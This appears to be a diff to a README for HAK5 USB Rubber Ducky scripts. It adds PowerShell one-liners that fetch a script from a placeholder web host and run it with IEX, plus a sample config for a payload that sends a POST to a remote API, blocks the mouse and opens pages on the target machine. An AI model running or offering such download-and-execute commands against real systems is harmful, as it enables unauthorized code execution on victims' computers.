@@ -18,6 +18,43 @@ A few scripts for the USB rubber ducky from HAK5. The scripts are written in duc
 
 This Rubber Ducky Script executes a custom powershell script that is hosted online. Host the `powershellScript.txt` or a custom script online and change the locatin in `ExeWebScript.duck` to that hosted script. 
 
+### Ducky script
+It uses IEX to execute plain text from wget. Examples:
+```powershell
+# shortest
+  iwr www.yourSite.com/powershellScript.txt|iex
+
+# alternative
+  iex (wget www.yourSite.com/powershellScript.txt)
+
+```
+### Powershell script
+The powershellScript.txt is just as an example of what some 'harmless' things that you could do.  
+It comes with a config for some options.
+```powershell
+#================================
+#            CONFIG 
+#================================     
+
+    $MinimizeWindows = $True;
+    $ShowPopUp = $False;
+
+    $OpenWebPage = $True;
+        $urlNAV = "www.yourWebsite.com/PageToDisplay";
+        $OpenInFullScreen = $True;    
+        
+    $SendPostToAPI = $True;
+        $urlAPI = "www.yourWebsite.com/PostAPI";
+        
+    $BlockMouse = $True;
+        $BlockedTimeSeconds = 8;
+
+    $SpeakText = $True;
+        $TextToSpeak = "Hi. This is a Rubber Ducky";
+
+#===============================
+```
+
 ## SendSystemInfo
 > **Note!** Your password and emailadress wil be typed in plain text on the victem's computer  
 
